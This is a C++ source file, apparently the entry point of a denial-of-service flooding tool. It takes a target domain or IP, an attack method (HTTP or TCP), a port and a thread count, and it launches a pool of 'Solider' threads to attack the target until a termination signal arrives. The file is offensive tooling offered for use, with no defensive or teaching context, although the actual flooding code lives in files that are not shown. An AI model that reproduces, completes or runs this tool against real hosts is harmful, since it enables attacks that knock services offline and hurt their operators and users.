#include <signal.h>

#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <atomic>

#include "api_interface.h"
#include "args-parser/all.hpp"

#include "args-parser/enums.hpp"
#include "config.h"
#include "solider.h"
#include "globals.h"

using namespace Args;

void signalHanlder(int signum) 
{
	std::cerr << "Stoping" << std::endl;
	g_shouldStop.store(true);
}

int main(int argc, char **argv)
{
	signal(SIGTERM, signalHanlder);
	signal(SIGHUP, signalHanlder);

	CmdLine cmd(argc, argv);
	try
	{
		cmd.addArgWithNameOnly("target", true, true, "Domain or IP of target")
			.addArgWithNameOnly("method", true, true, "Method to use")
			.addArgWithNameOnly("threads", true, false, "Count of threads to use")
			.addArgWithNameOnly("port", true, false, "Port to attack");
		cmd.parse();
	}
	catch(const BaseException &x)
	{
		std::cerr << x.what() << ": " << x.desc() << std::endl;
		return 0;
	}

	const std::string target = cmd.value("--target");
	std::optional<int> port{std::nullopt};
	if(cmd.isDefined("--port"))
	{
		try
		{
			port = std::stoi(cmd.value("--port"));
		}
		catch(...)
		{
			std::cerr << "Failed to parse port number" << std::endl;
			return -1;
		}
	}

	Informator::AttackMethod attackMethod;
	const std::string method = cmd.value("--method");
	if(method == "http")
	{
		attackMethod = Informator::AttackMethod::HTTPAttack;
	}
	else if(method == "tcp")
	{
		attackMethod = Informator::AttackMethod::TCPAttack;
		if(!port)
		{
			std::cerr << "TCP attack should have port!" << std::endl;
			return -1;
		}
	}
	else if(method == "udp")
	{
		std::cerr << "Not implemented yet" << std::endl;
		return -1;
	}
	else
	{
		std::cerr << "Failed to parse: " << method << " to methods!" << std::endl;
		return -1;
	}


	size_t maxThreads = 
		std::thread::hardware_concurrency() == 0 ? 2 : std::thread::hardware_concurrency();

	if(cmd.isDefined("--threads"))
	{
		try
		{
			maxThreads = std::stoull(cmd.value("--threads"));
		}
		catch(...)
		{
			std::cerr << "Failed to parse number" << std::endl;
			return -1;
		}
	}

	std::vector<std::thread> pool;
	for(size_t i = 0; i < maxThreads; i++)
	{
		Solider solider{attackMethod, target, port.value_or(0)};
		pool.emplace_back(std::move(solider));
	}

	for(auto &thread : pool)
	{
		if(thread.joinable())
		{
			thread.join();
		}
	}
	std::cout << "Succesfully stoped" << std::endl;
}
